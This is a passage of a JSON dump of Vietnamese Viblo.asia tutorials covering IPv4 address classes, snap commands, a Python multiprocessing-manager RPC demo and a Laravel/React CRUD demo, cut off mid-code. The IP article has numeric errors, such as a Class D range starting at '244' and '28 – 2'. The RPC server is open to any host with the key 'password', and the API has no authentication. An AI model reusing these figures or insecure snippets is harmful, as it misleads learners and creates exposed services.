mới cho giao thức IP.\n* **Padding (độ dài thay đổi)**: Cấu trúc của gói IP quy định option phải là bội số của 32 bit nên nếu option không đủ số bit , các bit padding sẽ được thêm vào để đạt được yêu cầu này .\n* **Data (độ dài thay đổi)**: vùng dữ liệu có độ dài là bội của 8 bit, tối đa là 65535 byte.\n\n# Địa chỉ IP\nMỗi máy tính khi kết nối Internet đều có 1 địa chỉ duy nhất, đó chính là địa chỉ IP. Mục đích là để định danh duy nhất cho 1 máy tính bất kỳ trên liên mạng.\n## Cấu trúc địa chỉ\n* Địa chỉ IP gồm 32 bit nhị phân , chia thành 4 cụm 8 bit (gọi là các octet). Các octet được biểu diễn dưới dạng thập phân và được ngăn cách bằng các dấu chấm.\n* Địa chỉ IP được chia thành 2 phần : phần **NetworkID** (phần địa chỉ mạng) và phần **HostID** (phần địa chỉ máy trạm)\n![](https://images.viblo.asia/3c9aa2d6-8ecf-48f6-a811-ba31923abd64.jpg) *Hình 1*\n\n* Trong 1 byte (8 bit) , mỗi bit được gán một giá trị. Nếu bit được đặt là 0 thì nó được gán giá trị 0, nếu bit được đặt là 1 thì có thể chuyển đổi thành 1 giá trị thập phân. Bit thấp nhất trong byte tương ứng với 1, bit cao nhất tương ứng với 128. Vậy giá trị lớn nhất của 1 byte là 255 tương ứng với trường hợp cả 8 bit đều được đặt là 1.\n![](https://images.viblo.asia/06448004-2b80-45d7-b964-27b759b717ef.png)\n * Ví dụ ở *Hình 1*, với octet đầu tiên và dựa vào cách tính ở hình trên ta có: 10000011 = 128+0+0+0+0+0+2+1 = 131. Tương tự với 3 octet còn lại, ta sẽ ra được 1 địa chỉ IP là 131.108.122.204 \n*  Chú ý: Các bit phần NetworkID **không được phép** đồng thời bằng **0**.\n## Các dạng địa chỉ\n* **Địa chỉ mạng** (Network Address):\n    * Định danh cho một mạng\n    * **Tất cả các bit phần HostID là 0**\n\n* **Địa chỉ quảng bá** (Broadcast Address)\n    * Địa chỉ dùng để gửi dữ liệu cho tất cả các máy trạm trong mạng\n    * **Tất cả các bit phần HostID là 1**\n\n* **Địa chỉ máy trạm** (Unicast Address): gán cho một cổng mạng\n* **Địa chỉ nhóm** (Multicast address): định danh cho nhóm\n## Các lớp địa chỉ\nKhông gian địa chỉ IP được chia thành các lớp như sau:\n![](https://images.viblo.asia/20b1e1f3-555d-483d-80a7-01c71843d4fe.png)\n\n### Lớp A\n* Địa chỉ lớp A sử dụng một otet(8 bit) đầu làm phần mạng, ba octet sau làm phần host\n* Bit đầu của một địa chỉ lớp A luôn được giữ là ***0***.\n* Các địa chỉ lớp mạng của lớp A gồm : ***1.0.0.0 -> 126.0.0.0***.\n* Mạng ***127.0.0.0*** được sử dụng làm ***loopback***\n* Phần host có 24 bit => mỗi mạng lớp A có (***2^24 – 2***) host.\n\n### Lớp B\n* Địa chỉ lớp B sử dụng hai octet đầu làm phần mạng , hai octet sau làm phần host.\n* Hai bit đầu của một địa chỉ lớp B luôn được giữ là ***1 0***\n* Các địa chỉ mạng lớp B gồm : ***128.0.0.0 -> 191.255.0.0*** . Có tất cả ***2^14=16384*** mạng trong lớp B.\n* Phần host dài 16 bit => một mạng lớp B có (***2^16 – 2 = 65534***) host.\n\n### Lớp C\n* Địa chỉ lớp C sử dụng 3 octet đầu làm phần mạng , một octet sau làm phần host.\n* Ba bit đầu của một địa chỉ lớp C luôn được giữ là ***1 1 0***.\n* Các địa chỉ mạng lớp C gồm : ***192.0.0.0 -> 223.255.255.0***. Có tất cả ***2^21*** mạng trong lớp C.\n* Phần host dài 8 bit do đó có một mạng lớp C có (***28 – 2 = 254***) host.\n\n### Lớp D\n* Bốn bit đầu của một địa chỉ lớp D luôn được giữ là ***1 1 1 0***\n* Gồm các địa chỉ thuộc dải: ***244.0.0.0 -> 239.255.255.255***\n* Được sử dụng để làm địa chỉ ***multicast***.\n\n### Lớp E\n* Năm bit đầu của một địa chỉ lớp E luôn được giữ là ***1 1 1 1***\n* Địa chỉ thuộc dải từ ***240.0.0.0*** trở đi\n* Được sử dụng cho mục đích dự phòng.\n\n**Chú ý:**\n* Các lớp địa chỉ IP có thể sử dụng để đặt cho các host là các lớp A,B,C\n* Để dễ dàng nhận diện một địa chỉ IP thuộc lớp nào , ta có thể quan sát octet đầu của địa chỉ nằm trong khoảng giá trị:\n\n|  Địa chỉ lớp | Octet đầu của địa chỉ | \n| -------- | -------- | \n| A     | 1 -> 126     |\n| B     | 128 -> 191    |\n| C    | 192 -> 223    |\n| D     | 224 -> 239   |\n| E     | 240 -> 255    |\n\nTuy nhiên việc phân chia cứng thành các lớp (A, B, C, D, E) làm hạn chế việc sử dụng toàn bộ không gian địa chỉ dẫn đến lãng phí không gian địa chỉ. Vậy giải pháp là gì:thinking:? \nỞ phần 2 mình sẽ nói tiếp về cách giải quyết vần đề này thé!:wink: \n\nThanks for reading:sparkling_heart:\n\n*Nguồn tham khảo*: Giáo trình *mạng máy tính* của Đại học Bách Khoa Hà Nội",
        "published_at": "2020-02-11 13:25:25",
        "is_published": true,
        "updated_at": "2020-02-12 21:42:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 11,
        "points": 8,
        "views_count": 82,
        "clips_count": 0,
        "comments_count": 2,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/d16966f4-c811-48b3-825b-7728507ef05d.png",
        "user": {
            "data": {
                "id": 26491,
                "url": "https://viblo.asia/u/HuyenNguyen",
                "avatar": "e7a04af0-61c9-44e4-88bd-0243c7fce5aa.jpg",
                "name": "HuyenNguyen",
                "username": "HuyenNguyen",
                "followers_count": 9,
                "reputation": 460,
                "posts_count": 17,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "giao-thuc-ip",
                    "name": "Giao thức IP",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Giao+thức+IP&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "mo-hinh-tcpip",
                    "name": "Mô hình TCP/IP",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Mô+hình+TCPIP&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 27213,
                    "url": "https://viblo.asia/u/anhnq98",
                    "avatar": "2ede8126-b6f6-41a4-9909-b012d4f79c96.jpeg",
                    "name": "Quang Anh",
                    "username": "anhnq98",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 28296,
                    "url": "https://viblo.asia/u/DatB",
                    "avatar": "d9cf90c5-8ff6-4588-aa6c-b1c35684c426.JPG",
                    "name": "Nguyen Dat",
                    "username": "DatB",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        }
    },
    {
        "id": 38369,
        "title": "Snap cài đặt mọi thứ với terminal",
        "slug": "Eb85ox3WK2G",
        "url": "https://viblo.asia/p/snap-cai-dat-moi-thu-voi-terminal-Eb85ox3WK2G",
        "user_id": 39866,
        "moderation": null,
        "transliterated": "snap-cai-dat-moi-thu-voi-terminal",
        "contents_short": "Giới thiệu.\nỞ những người dùng linux thì việc cài đặt một ứng dụng có rất nhiều cách khác nhau . Ví dụ như : Packages,software , cài đặt bằng file riêng của từng distros (.deb). Nhưng hôm nay, mình...",
        "contents": "# Giới thiệu.\nỞ những người dùng linux thì việc cài đặt một ứng dụng có rất nhiều cách khác nhau . Ví dụ như : Packages,software , cài đặt bằng file riêng của từng distros (.deb). Nhưng hôm nay, mình xin hướng dẫn cách chung nhất có thể sử dụng trên nhiều bản phân phối linux đó chính snap Packages . Tại sao mình lại giới thiệu cách này ? Packages snap được Cacnonical giới thiệu vào bản cập nhật Ubuntu 16.04 LTS .Nó được sinh ra với mục tiêu làm cho việc cài đặt trở nên dể dàng , an toàn và tiện lợi.Với hơn 600 ứng dụng có sẵn mình tin sẽ đáp ứng đủ phần nào cho đại đa số người dùng Linux.\n\n# 1.Cài đặt snap.\nỞ Ubuntu vì nó đã có sẵn trong Packages apt nên việc cài đặt rất đơn giản.\n```\n$ sudo apt update\n$ sudo apt install snapd\n```\nỞ các bản phân phối khác các bạn có thể truy cập vào trang chủ của snapstore để xem.\nhttps://snapcraft.io/snap-store\n\n# 2.Tìm kiếm.\nViệc đầu tiên bạn muốn cài đặt một ứng dụng nào đó bạn phải tìm kiếm hoặc kiểm tra xem nó có tồn tại trong kho ứng dụng không.Ở snap việc tìm kiếm khá nhanh và đơn giản.\n```\nsnap find <search_text>\n```\n\nVí dụ:\n![](https://images.viblo.asia/4f5fcbcf-9157-4f51-8054-46b96e866a4a.png)\n# 3.Cài đặt.\nSau khi đã biết nó có tồn tại thì đến phần ta mong muốn nhất đó chính là cài đặt phần mềm.Các bạn lưu ý như sau khi cài đặt nếu phần mềm bạn muốn cài đặt ở phần Notes không phải dấu '-' thì hãy thêm từ đó vào sau tên phần mềm bạn muốn cài đặt.\n```\nsudo snap install <package>\n```\n\nVí dụ:\n![](https://images.viblo.asia/08bbc0f8-e4d9-45aa-a35c-9a564fd95bd3.png)\n\n# 4.Xem danh sách.\nĐể xem danh sách các ứng dụng đã tải.\n```\nsnap list\n```\n\n![](https://images.viblo.asia/7e83760e-2f0e-4b12-bc02-dcf83455bbee.png)\n\n\n# 5.Xóa.\nĐã có nhu cầu tải một ứng thì đôi lúc bạn cũng phải có nhu cầu xóa một ứng dụng đi.Câu lênh xóa như sau:\n\n```\nsudo snap remove <package>`\n```\n\nVí dụ:\n![](https://images.viblo.asia/ace6b758-c2ca-42c2-8c44-40c52a126165.png)\n\n# 6.Cập nhật\nỞ snap việc cập nhật là tự động.Nhưng nếu muốn vẫn có thể cập nhật bằng tay.\n\n```\nsudo snap refresh --list\n```\n\nNguồn tham khảo:\n\nhttps://itsfoss.com/use-snap-packages-ubuntu-16-04/\n\nhttps://quantrimang.com/so-sanh-flathub-va-snap-store-166089",
        "published_at": "2020-02-11 11:58:50",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 2,
        "points": 2,
        "views_count": 51,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/4f5fcbcf-9157-4f51-8054-46b96e866a4a.png",
        "user": {
            "data": {
                "id": 39866,
                "url": "https://viblo.asia/u/nguyenphuc22",
                "avatar": "7bdb8070-c72b-4a52-8273-f208b2a0a272.jpg",
                "name": "Nguyễn Phúc",
                "username": "nguyenphuc22",
                "followers_count": 1,
                "reputation": 19,
                "posts_count": 4,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "linux",
                    "name": "Linux",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Linux&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "snap",
                    "name": "snap",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=snap&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "terminal",
                    "name": "Terminal",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Terminal&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38393,
        "title": "TẠO RPC TRÊN PYTHON3",
        "slug": "924lJqnmZPM",
        "url": "https://viblo.asia/p/tao-rpc-tren-python3-924lJqnmZPM",
        "user_id": 33432,
        "moderation": null,
        "transliterated": "tao-rpc-tren-python3",
        "contents_short": "RPC hoàn thành bằng module tiêu chuẩn của Python3\nNguồn:  https://qiita.com/nardtree/items/d7458eab839a6500a60a\n\nHiện tại, số lượng chủng loại của RPC trong Python là quá nhiều.\nTại năm 2020, phần ...",
        "contents": "RPC hoàn thành bằng module tiêu chuẩn của Python3\nNguồn:  https://qiita.com/nardtree/items/d7458eab839a6500a60a\n\n\nHiện tại, số lượng chủng loại của RPC trong Python là quá nhiều.\nTại năm 2020, phần lớn RPC được công khai với tư cách là OSS, tuy nhiên vì có quá nhiều chủng loại dẫn tới việc gia tăng những chi phí kèm theo như chi phí chọn lựa, chi phí đánh giá, chi phí học tập mà nó khiến cho tôi cảm thấy có vấn đề về mặt cá nhân.\n\nĐối với chúng ta, thời gian là quý nhất, cho nên nếu dành thời gian để kiểm tra từng cái library hiện ra, rồi học cách dùng thì trong trường hợp cần làm nhanh PoC hay tạo những sản phẩm nhỏ theo kiểu đã đóng API chẳng hạn, thì sẽ không thích hợp cho lắm.\n\nTrong multiprocessing của Python có tồn tại manager class, và thông qua việc dùng network để truyền tin giữa các process khi thực hiện multiprocessing, mà có thể implement Remote Procedure Call có tính năng cao hơn.\n\nRPC sẽ rất tiện lợi khi bạn tiến hành xử lý phân tán quy mô lớn thông qua việc gọi hoặc truyền lệnh xử lý đến những computer khác nhau trong 1 hệ thống.\n\nGiá trị của việc chạy bằng library tiêu chuẩn:\n\nTôi đã dùng qua nhiều library khác nhau rồi, nhưng những library đó vừa không còn hỗ trợ, vừa không có 1 thể chế để nhận pull request hay là tốn khá nhiều thời gian. Cho nên rất nhiều cái thư viện \"có vẻ tốt\" thì thực chất  là đã thuộc về dĩ vãng rồi.\n\nNếu được, thì không nên phụ thuộc vào library và implement đơn giản thôi, khi đó chỉ cần Python có tồn tại ( hay nói cách khác là trong Pythong không có deprecated) là có thể dùng rồi.\n\nGiải thích code \n\nDựa trên việc có thể suy nghĩ theo kiểu chi ra server và client, thì server là phía nhận mệnh lệnh trong khi client là phía phát hành lệnh.\n\n\n\n\nserver\n\nfrom multiprocessing.managers import BaseManager as Manager\nimport os\n\n//HÌnh dung là KVS của InMemory \nobj = {}\ndef get(k):\n    print('get', k)\n    return obj.get(k)\n\ndef put(k, v):\n    obj[k] = v\n    print('put', k,v)\n\n// Lấy unam của server(function để biết là Linux hay MacOS)\ndef get_uname():\n    print('get_uname')\n    return str(os.uname())\n\nif __name__ == \"__main__\":\n    port_num = 4343\n    Manager.register(\"get\", get) # Đăng kí function dùng cho nhận lệnh\n    Manager.register(\"put\", put)\n    Manager.register(\"get_uname\", get_uname)\n    manager = Manager((\"\", port_num), authkey=b\"password\") # Bằng cách để trống hostname, có thể nhận lệnh từ bất kì đâu. Có thể set password\n    manager.start()\n    input(\"Press any key to kill server\".center(50, \"-\")) # Nhập cái gì đó vào là xong \n    manager.shutdown()\nclient\n\nfrom multiprocessing.managers import BaseManager as Manager\nManager.register(\"get\") # Đăng kí function\nManager.register(\"put\")\nManager.register(\"get_uname\")\n\nif __name__ == \"__main__\":\n    port_num = 4343\n\n    manager = Manager(address=('25.48.219.74', port_num), authkey=b\"password\")\n    manager.connect()\n    print('get', manager.get('a')) // Tôi nghĩ là sẽ trả về None\n    print('put', manager.put('a', 10)) // a -> Set là 10 \n    print('get', manager.get('a').conjugate()) // Tôi nghĩ sẽ trả về 10, (Những format kiểu primitive chẳng hạn thì lấy ra bằng function conjugate)\n    print('get_uname', manager.get_uname()) //Đang chạy client bằng MacOS nhưng mà server thì chắc là Linux \n\n\nKhi chạy thử code: \n\nBằng server Linux (ubuntu), client MacOS(darwin), chúng tôi đã chạy chương trình ghi phía trên tại PC đặt tại nhà tôi thông qua việc thao tác ở cửa hàng cafe.\n\nKết quả là tôi có thể chạy theo đúng ý muốn của tôi, y chang như những gì tôi đã nghĩ.\n\nLấy ví dụ của việc này, đó là việc có thể xử lý số view Youtube, trend keyword của Twitter, không phải chạy từng câu lệnh BigQuery hay Redshift với mật độ cao mà vẫn có thể tổng hợp dữ liệu 1 cách hiệu quả. \n\nTÔi cũng rất coi trọng việc học hỏi các tool mới, nhưng tôi cũng rất coi trọng việc tối giản hóa bằng những gì đã có, thế nên hi vọng các bạn cũng có thể để mắt đến cách làm này nhằm đạt được mục tiêu bằng chi phí thấp nhất.\n\nVí dụ thêm: Code đếm số view Youtube.\n\nTôi hình dung là fork cái client thì sẽ có rất nhiều access từ nhiều nguồn khác nhau.\n\nclient\n\nfrom concurrent.futures import ProcessPoolExecutor\nimport random\nfrom multiprocessing.managers import BaseManager as Manager\nManager.register(\"get\")  # đăng kí function\nManager.register(\"inc\")\n\ndef extract(x):\n    if hasattr(x, 'conjugate'):\n        return x.conjugate()\n    else:\n        return x\n\n\ndef hikakin_watch(num):\n    port_num = 4343\n    manager = Manager(address=('127.0.0.1', port_num), authkey=b\"password\")\n    manager.connect()\n    for i in range(1000):\n        try:\n            now = extract(manager.get('hikakin'))\n            print(now)\n            manager.inc('hikakin')\n        except Exception as exc:\n            print(exc)\n\nif __name__ == \"__main__\":\n    with ProcessPoolExecutor(max_workers=5) as exe:\n        exe.map(hikakin_watch, list(range(5)))\n\n    port_num = 4343\n    manager = Manager(address=('127.0.0.1', port_num), authkey=b\"password\")\n    manager.connect()\n    now = extract(manager.get('hikakin'))\n    print(now)\nserver\n\nfrom multiprocessing.managers import BaseManager as Manager\nimport os\n\n//Hình dung là KVS của inmemory\nobj = {}\ndef get(k):\n    if k not in obj:\n        obj[k] = 0\n    return obj.get(k)\n\ndef inc(k):\n    obj[k] += 1\n\nif __name__ == \"__main__\":\n    port_num = 4343\n    Manager.register(\"get\", get) # Đăng kí function nhận lệnh\n    Manager.register(\"inc\", inc)\n    manager = Manager((\"\", port_num), authkey=b\"password\") // Bỏ trống hostname để có thể nhận lệnh từ bất kì nơi đâu. Có thể set password.\n    manager.start()\n    input(\"Press any key to kill server\".center(50, \"-\")) // Nhập bất cứ cái gì là xong\n    manager.shutdown()\n    \nTôi nhận được con số 5000 như là output mà mình đã mong đợi, dù là đối với access song song thì cũng có thể giới hạn loại trừ rất rõ ràng.\n\nCó thể dùng cho việc đếm số view YouTube",
        "published_at": "2020-02-11 09:48:40",
        "is_published": true,
        "updated_at": "2020-02-12 20:34:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 6,
        "points": 0,
        "views_count": 51,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": null,
        "user": {
            "data": {
                "id": 33432,
                "url": "https://viblo.asia/u/phanduyvan",
                "avatar": "30b05f16-87a6-4343-8be7-4dac1969137b.jpg",
                "name": "Phan Duy Van",
                "username": "phanduyvan",
                "followers_count": 3,
                "reputation": 40,
                "posts_count": 7,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "viewcounter",
                    "name": "viewcounter",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=viewcounter&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "rpc",
                    "name": "rpc",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=rpc&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "python",
                    "name": "Python",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Python&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "server",
                    "name": "Server",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Server&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "client",
                    "name": "client",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=client&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38383,
        "title": "Sử dụng ReactJs trong project Laravel",
        "slug": "OeVKBJpdKkW",
        "url": "https://viblo.asia/p/su-dung-reactjs-trong-project-laravel-OeVKBJpdKkW",
        "user_id": 34730,
        "moderation": null,
        "transliterated": "su-dung-reactjs-trong-project-laravel",
        "contents_short": "Trong thời gian gần đây, Single Page App (SPA) đang rất được các dev ưa chuộng vì nó làm tăng trải nghiệm của người dùng rất là nhiều. Từ trước tới giờ mình cũng rất ít khi tìm hiểu về các framewor...",
        "contents": "Trong thời gian gần đây, Single Page App (SPA) đang rất được các dev ưa chuộng vì nó làm tăng trải nghiệm của người dùng rất là nhiều. Từ trước tới giờ mình cũng rất ít khi tìm hiểu về các framework js. Nhưng để bắt kịp xu thế thì mình cũng đã tự mày mò tìm hiểu chút ReacJs :D. Và với nên tảng là một người học Laravel và Laravel cũng hỗ trợ việc sử dụng ReactJs, sau khi tìm hiểu một chút thì mình cũng có thể sử dụng được ReactJs để tạo một SPA đơn giản trong một project Laravel. Hôm nay viết bài này chia sẻ với mọi người chút, nếu bạn nào muốn tìm hiểu thì có thể đọc qua, còn ai thấy mình sai ở đâu thì mình mong các bạn góp ý để mình viết :D\n\n# Một vài yêu cầu\nĐể thực hiện được demo này thì có chút yêu cầu về hệ thống và kiến thức mà mình nghĩ các bạn sẽ cần phải có\n\n* Có kiến thức cơ bản về Laravel, ReactJs\n* Máy đã cài PHP, npm, Composer, Laravel, MySQL, PHP MyAdmin (có thể là những trình quản lý tương đương hoặc bạn có thể sử dụng command nếu bạn nắm vững)\n\n# Mô tả demo\nỞ demo này, mình sẽ làm 1 SPA đơn giản bao gồm hiển thị danh sách, thêm, sửa, xóa bài viết\n![](https://images.viblo.asia/41ee5e40-a961-45a2-b82e-de1ea2e12b68.gif)\n\n# Bắt đầu\nĐầu tiên chúng ta cần tạo 1 project Laravel:\n```\nlaravel new demo-reactjs\n```\n\nSau đó, bạn hãy truy cập vào source code của project, sử dụng lệnh preset để chỉ định framework js muốn sử dụng:\n```\nphp artisan preset react\n```\n\nVà sau đó chạy:\n```\nnpm install\n```\n\nTiếp tới thì chúng ta cần config file `.env`. Mọi người có kiến thức cơ bản về Laravel đều biết điều này rồi nên mình sẽ không nói lại nữa nhé. À còn một việc nữa, đó là ở đây mình sẽ sử dụng arrow function khi viết code js nên cần phải tạo 1 file `.babelrc` trong source code của project. Nội dung file sẽ như sau:\n```\n{\n    \"presets\": [\n        \"@babel/preset-env\",\n        \"@babel/preset-react\"\n    ],\n    \"plugins\": [\n        \"@babel/plugin-proposal-class-properties\"\n    ]\n}\n```\nNếu không có đoạn `\"@babel/plugin-proposal-class-properties\"` mà bạn sử dụng arrow function thì sẽ gặp lỗi khi run watch (Cái này lúc làm thử mình cũng mới biết :D)\n\n# Tạo model và migration\nNhững thiết lập cơ bản đã xong, giờ chúng ta cần chuẩn bị db để có thể lưu dữ liệu. Nhưng đã giới thiệu thì mình sẽ chỉ làm chức năng thêm sửa xóa bài viết. Vậy ở đây mình sẽ chỉ cần 1 bảng `posts`\n```\nphp artisan make:model Post -m\n```\n\nVì không cần những bảng khác nên mình sẽ xóa tất cả các file trong `migrations`, chỉ giữ lại file để migrate bảng `posts`\n```php\n<?php\n\nuse Illuminate\\Database\\Migrations\\Migration;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Support\\Facades\\Schema;\n\nclass CreatePostsTable extends Migration\n{\n    /**\n     * Run the migrations.\n     *\n     * @return void\n     */\n    public function up()\n    {\n        Schema::create('posts', function (Blueprint $table) {\n            $table->increments('id');\n            $table->string('title');\n            $table->text('content');\n            $table->timestamps();\n        });\n    }\n\n    /**\n     * Reverse the migrations.\n     *\n     * @return void\n     */\n    public function down()\n    {\n        Schema::dropIfExists('posts');\n    }\n}\n```\n\nModel `Post` của mình sẽ như sau: \n```php\n<?php\n\nnamespace App;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Post extends Model\n{\n    protected $fillable = [\n        'title',\n        'content',\n    ];\n}\n```\n\nXong xuôi mọi thứ thì migrate thôi:\n```\nphp artisan migrate\n```\n\n# Tạo API\nỞ đây mình sẽ tạo api đơn giản, không có authenticate đâu nhé :D Nếu bạn muốn chăm chút hơn cho project này thì có thể xem cách tạo authenticate api với laravel của mình ở bài này nhé : [API Authentication với passpost trong Laravel 5.8](https://viblo.asia/p/api-authentication-voi-passpost-trong-laravel-58-aWj534r8K6m)\n\nTrong file `api.php`, mình sẽ tạo nhưng route để xử lý những hành động cơ bản:\n```php\nRoute::prefix('posts')->name('posts.')->group(function () {\n    Route::get('', 'PostController@index')->name('index') //Danh sách;\n    Route::post('', 'PostController@store')->name('store') //Lưu;\n    Route::get('{post}', 'PostController@show')->name('show') //Chi tiết;\n    Route::post('{post}', 'PostController@update')->name('update') //Cập nhập;\n    Route::post('delete/{post}', 'PostController@delete')->name('delete') //Xóa;\n});\n```\n\nGiờ thì phải tạo `PostController`:\n```\nphp artisan make:controller PostController\n```\n\n```php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Post;\nuse Illuminate\\Http\\Request;\n\nclass PostController extends Controller\n{\n    public function index()\n    {\n        $posts = Post::orderBy('id', 'desc')->get();\n\n        return response()->json($posts, 200);\n    }\n\n    public function store(Request $request)\n    {\n        $data = $request->all();\n        $post = Post::create($data);\n\n        return response()->json($post, 200);\n    }\n\n    public function show(Post $post)\n    {\n        return response()->json($post, 200);\n    }\n\n    public function update(Request $request, Post $post)\n    {\n        $data = $request->all();\n        $post->update($data);\n\n        return response()->json($post, 200);\n    }\n\n    public function delete(Post $post)\n    {\n        $post->delete();\n        $posts = Post::orderBy('id', 'desc')->get();\n\n        return response()->json($posts, 200);\n    }\n}\n```\nDo làm demo nhanh nên mình sẽ không validate dữ liệu ở backend :D các bạn thông cảm nha. Ở đây vì chúng ta đang tạo api nên tất các kết quả trả về đều phải để dưới dạng json\n\n# Tạo wildcard route\nỞ file `web.php`, mình sẽ viết như sau:\n```php\nRoute::get('{path?}', 'RenderSpaView')->where('path', '[a-zA-Z0-9-/]+');\n```\nĐoạn này có nghĩa là sao, tức là tất cả những chuỗi url nào thỏa mạn điều kiện regex trên đều sẽ chạy vào file `RenderSpaView`.  Ở đây là mình đang để tất cả mọi trường hợp\n\nGiờ thì phải tạo file `RenderSpaView`:\n```\nphp artisan make:controller RenderSpaView\n```\n```php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass RenderSpaView extends Controller\n{\n    public function __invoke()\n    {\n        return view('spa-view');\n    }\n}\n```\nGiờ trong view mình sẽ tạo file `spa-view.blade.php`\n```php\n<!DOCTYPE html>\n<html lang=\"{{ app()->getLocale() }}\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <!-- CSRF Token -->\n    <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\n    <title>Laravel & React</title>\n    <!-- Styles -->\n    <link href=\"{{ asset('css/app.css') }}\" rel=\"stylesheet\">\n</head>\n<body>\n<div id=\"app\"></div>\n\n<script src=\"{{ asset('js/app.js') }}\"></script>\n</body>\n</html>\n```\n\n# Tạo  các components\n## App Component\nGiờ bạn hãy mở thư mục `resources/js/components` sẽ thấy 1 file `Example.js`, hãy đổi file này thành `App.js`. Và bạn vào trong file `resources/js/app.js`, thay đoạn `require('./components/Example')` thành `require('./components/App')`  nhé. Giờ chúng ta sẽ phải cài thư viện: `react-router-dom` (là một thư viện định tuyến tiêu chuẩn trong react) \n```\nnpm install react-router-dom\n```\n`ant-design` (thư viện này sẽ hỗ trợ chúng ta code frontend một cách đơn giản hơn)\n```\nnpm install antd\n```\n\nVà đây sẽ là code trong file `App.js` của mình\n```javascript\nimport React, { Component } from 'react';\nimport ReactDOM from 'react-dom';\nimport { BrowserRouter, Route, Switch } from 'react-router-dom'\nimport 'antd/dist/antd.css';\n\nexport default class App extends Component {\n    render() {\n        return (\n            <BrowserRouter>\n                <div>\n                    Hello\n                </div>\n            </BrowserRouter>\n        );\n    }\n}\n\nReactDOM.render(<App />, document.getElementById('app'));\n```\n\nGiờ bạn hãy chạy\n```\nphp artisan serve\n```\nVà\n```\nnpm run watch\n```\nTruy cập vào đường dẫn `http://127.0.0.1:8000/` xem thử kết quả nhé :D, nếu bạn thấy chữ hello thì tức là đã thành công rồi đó\n\n## Header component\nGiờ chúng ta sẽ cần một chiếc Header đơn giản nhỉ,  mình sẽ vào đây: https://ant.design/components/page-header/ và tham khảo chút.\nTạo 1 file Header.js, mình sẽ để nút thêm bài viết để có thể chuyển tới trang tạo bài viết\n```javascript\nimport React from 'react';\nimport {Link} from 'react-router-dom'\nimport {PageHeader, Button} from 'antd';\n\nclass Header extends React.Component {\n    render() {\n        return (\n            <div>\n                <PageHeader\n                    style={{\n                        border: '1px solid rgb(235, 237, 240)',\n                    }}\n                    title=\"Bài viết\"\n                    extra={[\n                        <Link to='create'>\n                            <Button key=\"1\" type=\"primary\">\n                                Thêm bài viết\n                            </Button>\n                        </Link>\n                    ]}\n                />\n            </div>\n        );\n    }\n}\n\nexport default Header;\n```\nGiờ quay lại `App.js` và thêm component `Header` nào, không còn Hello nữa đâu nhé\n```javascript\nimport Header from './Header';\n\n\n<BrowserRouter>\n    <div>\n        <Header />\n    </div\n</BrowserRouter>\n```\n\n## Add component\nGiờ chúng ta cần 1 view để thêm bài viết, vậy mình sẽ tạo ra `Add.js`\n```javascript\nimport React from 'react';\nimport axios from 'axios'\nimport { Form, Input, Button } from 'antd';\n\nconst { TextArea } = Input;\n\nclass Add extends React.Component {\n    constructor(props) {\n        super(props)\n    }\n\n    handleSubmit = e => {\n        